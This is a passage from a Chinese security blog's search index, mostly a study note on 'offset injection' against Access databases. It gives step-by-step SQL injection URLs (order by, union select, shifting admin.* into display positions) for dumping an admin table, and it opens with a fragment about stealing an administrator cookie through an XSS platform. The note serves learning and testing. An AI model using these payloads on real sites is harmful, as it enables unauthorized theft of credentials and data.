alt></p><p>那我们就可以开始通过xss平台上的payload去获取管理员的cookie了。</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>access数据库之偏移注入</title>
      <link href="/2019/12/07/access/"/>
      <url>/2019/12/07/access/</url>
      
        <content type="html"><![CDATA[<h2 id="偏移注入介绍"><a href="#偏移注入介绍" class="headerlink" title="偏移注入介绍"></a>偏移注入介绍</h2><p>偏移注入是指我们在知道表，但查询不出来字段的情况，如系统自带的数据库权限不够而无法通过联合查询访问到系统自带库来爆出字段，而因为字段过长，sqlmap也难以爆出；或者是数据库是access数据库，默认没有系统库；而当遇到类似这种情况的时候，我们就可以尝试通过偏移注入来查询表里的数据；</p><h2 id><a href="#" class="headerlink" title="*"></a>*</h2><p><em>是通配符的意思，我们可以通过</em>来表示sql语句中已知表中的所有字段，在下面我们可以通过admin.*来表示admin表的所有字段。</p><h2 id="偏移注入流程"><a href="#偏移注入流程" class="headerlink" title="偏移注入流程"></a>偏移注入流程</h2><ol><li>判断注入点</li><li>order by 判断字段数</li><li>知道表名</li><li>联合查询</li><li>获取表中列数(知道存在几个字段以及输出点在哪)</li><li>开始偏移注入</li></ol><h2 id="具体做法讲解"><a href="#具体做法讲解" class="headerlink" title="具体做法讲解"></a>具体做法讲解</h2><p>如果我们已经知道的是admin这张表；<br>我们可以通过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select exists(selct * from admin);</span><br></pre></td></tr></table></figure><p>来猜测是否有admin表，如果说存在的话页面就会显示正常。</p><p>exists函数的用法：EXISTS用于检查子查询是否至少会返回一行数据，该子查询实际上并不返回任何数据，而是返回值True或False</p><p>这里我们需要注意的是，access数据库联合查询后面是必须from一个表名，如果不知道表名，就直接用admin表，access数据库基本上有这个表。</p><ul><li><strong>判断字段数：</strong></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/new.php?id=1 order by 27  //错误显示</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/new.php?id=1 order by 26 //正常显示</span><br></pre></td></tr></table></figure><p>说明字段为26个字段</p><ul><li><strong>联合查询爆出显示位</strong>:</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/new.php?id=-1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26 from admin</span><br></pre></td></tr></table></figure><p>发现显示位是2，5，7；</p><ul><li><strong>开始偏移进行注入</strong></li></ul><p>在这里我们通过admin.*来表示admin表下的所有字段；</p><ul><li>admin表下所存在字段数：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/new.php?id=-1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,admin.* from admin</span><br></pre></td></tr></table></figure><p> 显示错误，说明admin表下字段不止一个，继续测试：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/new.php?id=-1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,admin.* from admin</span><br></pre></td></tr></table></figure><p>正常回显，说明admin下字段有8个;</p><ul><li>我们在通过偏移进行爆出字段内容：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/new.php?id=-1 union select 1,2,3,4,5,6,admin.*,15,16,17,18,19,20,21,22,23,24,25,26 from admin</span><br></pre></td></tr></table></figure><p>通过偏移到显示位，查看字段内容，如想继续看其他字段可继续偏移；</p><p>（这里记录的一切只代表我学习的笔记,不一定全部正确，如果有错误之处还望指正！）</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
